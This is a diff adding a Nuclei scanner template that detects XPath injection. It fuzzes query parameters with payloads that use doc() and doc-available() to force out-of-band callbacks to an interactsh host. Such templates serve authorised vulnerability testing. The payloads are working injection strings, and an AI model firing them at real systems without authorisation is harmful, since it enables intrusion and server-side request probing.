@@ -1,0 +1,35 @@
+id: xpath-injection
+
+info:
+  name: XPath Injection Detection
+  author: reewardius
+  reference: https://xcat.readthedocs.io/en/latest/
+  severity: medium
+  tags: fuzzing-ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      xpath:
+        - "*%20and%20doc('http://{{interactsh-url}}/oob/')"
+        - "%20and%20doc('http://{{interactsh-url}}/oob/')"
+        - "*%20and%20doc-available('http://{{interactsh-url}}/oob/')"
+        - "%20and%20doc-available('http://{{interactsh-url}}/oob/')"
+
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{xpath}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
